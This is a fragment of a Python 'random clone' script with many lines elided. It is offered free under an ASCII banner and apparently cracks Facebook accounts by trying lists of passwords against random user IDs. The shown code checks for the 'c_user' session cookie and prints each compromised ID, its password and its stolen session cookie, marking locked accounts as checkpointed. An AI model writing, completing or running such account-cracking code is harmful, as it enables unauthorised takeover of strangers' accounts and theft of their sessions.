...
for xd in range(10000):
	...
	ugen.append(uakua)
#os.system('xdg-open https://Youtube.com/@Quranulkareem')
logo = ("""
  \033[1;97m SUBSCRIBE KR LIYA KRO 🥺😔
 /$$$$$$$   /$$$$$$  /$$   /$$ /$$$$$$ /$$$$$$$ 
| $$__  $$ /$$__  $$| $$  /$$/|_  $$_/| $$__  $$
| $$  \ $$| $$  \ $$| $$ /$$/   | $$  | $$  \ $$
| $$$$$$$/| $$$$$$$$| $$$$$/    | $$  | $$$$$$$ 
...
|__/  |__/|__/  |__/|__/  \__/|______/|_______/ 
 ...
 ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
 ┃ [] AUTHOR    \033[1;91m: \033[1;92mAHMED SHAR                             ┃
 ┃ [] TOOL      \033[1;91m: \033[1;92mRANDOM CLONE                           ┃
 ┃ [] STATUS    \033[1;91m: \033[1;92mFREE                                             ┃
 ┃ [] SYSTEM    \033[1;91m: \033[1;92mDATA & WIFI                               ┃
 ┃ [] GITHUB    \033[1;91m: \033[1;92mTVAHMED                                    ┃
 ┃ [] FACEBOOK  \033[1;91m: \033[1;92mPRINCE KING HU YAWR          ┃
 ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛""")
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print(f"\033[38;5;46m[AHMED-OK💚] {uid} | {ps}")
                print(f" Cookie : {coki}")
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"\x1b[38;5;196m[AHMED-CP💔] {uid}|{ps}")
